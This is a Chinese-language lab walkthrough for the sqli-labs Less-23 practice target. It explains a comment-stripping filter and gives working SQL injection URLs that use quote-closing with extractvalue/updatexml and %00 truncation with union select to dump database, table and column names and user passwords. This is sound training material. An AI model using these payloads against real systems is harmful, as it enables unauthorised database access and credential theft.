# Sqli-Labs Less-23 复现

## 一、复现环境准备（可直接执行）

### 1. 基础环境

- 操作系统：Kali Linux（或Windows+PHPStudy）

- 靶场：sqli-labs（推荐部署在本地 `127.0.0.1/sqli-labs`）

- 核心依赖：PHP 5.6（高版本PHP需调整`mysql_*`函数兼容）、MySQL 5.5/5.7

- 工具：Burp Suite（抓包辅助，可选）、浏览器（Chrome/Firefox）

### 2. 环境校验

访问 `http://127.0.0.1/sqli-labs/Less-23/`，页面显示 `Please input the ID as parameter with numeric value`，说明环境正常。

## 二、核心原理

Less-23 的核心防护是**过滤注释符**：通过正则将 `#` 和 `--` 替换为空字符串，导致无法用传统注释截断SQL语句。

```PHP

$reg = "/#/";
$reg1 = "/--/";
$replace = "";
$id = preg_replace($reg, $replace, $id); // 过滤#
$id = preg_replace($reg1, $replace, $id); // 过滤--
$sql = "SELECT * FROM users WHERE id='$id' LIMIT 0,1"; // 单引号字符型注入
```

**绕过思路**：

1. **语句闭合**：用`' or 语句 or '` 闭合前后单引号，让SQL语句逻辑成立。

2. **%00 截断**：利用MySQL中`%00` 代表**空字符**，强制截断SQL语句（仅MySQL 5.1及以下版本有效，高版本需用闭合方式）。

## 三、注入类型判断（第一步必做）

向靶场传入参数，验证注入类型为**单引号字符型**：

1. 正常访问：`http://127.0.0.1/sqli-labs/Less-23/?id=1` → 显示正常数据。

2. 单引号测试：`http://127.0.0.1/sqli-labs/Less-23/?id=1'` → 页面报错（`You have an error in your SQL syntax`），说明存在单引号闭合。

3. 注释符测试：`http://127.0.0.1/sqli-labs/Less-23/?id=1'#` → 仍报错（#被过滤为空，语句变为`id='1''`），验证注释符失效。

## 四、方法一：语句闭合绕过（通用，推荐）

利用 `' or 注入语句 or '` 闭合前后单引号，让SQL语句执行注入逻辑。核心函数：`extractvalue()`（报错注入）、`union select`（联合查询）。

### 步骤1：爆数据库名

执行URL：

```Plain Text

http://127.0.0.1/sqli-labs/Less-23/?id=1' or extractvalue(1,concat(0x7e,database(),0x7e)) or '
```

- 结果解析：页面报错显示 `~security~`，即当前数据库为 `security`。

- 原理：`0x7e` 是波浪号`~`，用于区分报错信息和注入结果；`extractvalue()` 接收非法格式参数时会抛出包含查询结果的错误。

### 步骤2：爆数据库中的表名

执行URL：

```Plain Text

http://127.0.0.1/sqli-labs/Less-23/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='security'),0x7e)) or '
```

- 结果解析：显示 `~emails,referers,uagents,users~`，核心表为 `users`（存储账号密码）。

### 步骤3：爆users表的字段名

执行URL：

```Plain Text

http://127.0.0.1/sqli-labs/Less-23/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'),0x7e)) or '
```

- 结果解析：显示 `~id,username,password~`，核心字段为 `username`、`password`。

### 步骤4：爆账号密码数据

执行URL：

```Plain Text

http://127.0.0.1/sqli-labs/Less-23/?id=1' or extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from security.users),0x7e)) or '
```

- 结果解析：显示 `~Dumb:Dumb,Angelina:I-kill-you,...~`（完整数据需用`limit`分段查询，因`extractvalue`返回长度有限）。

## 五、方法二：%00 截断绕过（版本限制）

仅适用于 **MySQL 5.1 及以下版本**，利用`%00` 空字符截断SQL语句，替代注释符功能。

### 核心步骤

1. 构造截断语句：`http://127.0.0.1/sqli-labs/Less-23/?id=1'%00`

    - 实际执行的SQL：`SELECT * FROM users WHERE id='1' LIMIT 0,1`（`%00` 截断了后续空字符，语句恢复正常）。

2. 结合联合查询注入（需先判断字段数）：

    - 查字段数：`http://127.0.0.1/sqli-labs/Less-23/?id=1' order by 3%00`（无报错，说明字段数为3）。

    - 联合查库：`http://127.0.0.1/sqli-labs/Less-23/?id=-1' union select 1,database(),3%00`

    - 结果：页面直接显示数据库名 `security`。

## 六、CTF 实战拓展（适配Web方向备赛）

1. **绕过变种**：若靶场同时过滤`or`，可用`||` 替代（URL编码为`%7c%7c`），示例：

    ```Plain Text
    
    http://127.0.0.1/sqli-labs/Less-23/?id=1' || extractvalue(1,concat(0x7e,database(),0x7e)) || '
    ```

## 七、复现注意事项

1. 高版本MySQL（5.7+）中`%00` 截断失效，**优先使用语句闭合方法**。

2. 若`extractvalue` 被过滤，可替换为`updatexml()`，语法一致：`updatexml(1,concat(0x7e,注入语句,0x7e),1)`。

3. 本地复现若报错`mysql_fetch_array() expects parameter 1 to be resource`，需检查MySQL服务是否启动，或sqli-labs的数据库配置（`sql-connections/db-creds.inc`）。
> （注：文档部分内容可能由 AI 生成）